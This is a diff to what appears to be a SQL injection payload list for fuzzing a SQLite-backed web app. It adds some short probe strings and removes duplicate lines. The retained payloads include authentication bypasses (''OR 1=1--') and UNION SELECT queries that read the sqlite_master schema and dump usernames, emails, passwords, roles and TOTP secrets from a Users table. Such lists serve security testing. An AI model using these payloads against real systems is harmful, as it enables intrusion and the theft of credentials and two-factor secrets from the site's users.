@@ -1,3 +1,9 @@
+a
+%
+test
+2
+s
++
 '
 'OR 1=1--
 test'
@@ -32,9 +38,3 @@ test'--
 '))AND id=-1 UNION SELECT tbl_name,1,1,1,1,1,1,1,1 FROM sqlite_master ORDER BY tbl_name DESC--
 '))AND id=-1 UNION SELECT sql,1,1,1,1,1,1,1,1 FROM sqlite_master WHERE tbl_name='Users'--
 '))AND id=-1 UNION SELECT username,email,password,role,totpSecret,1,1,1,1 FROM Users--
-'
-'OR 1=1--
-test'
-test'--
-')
-')--
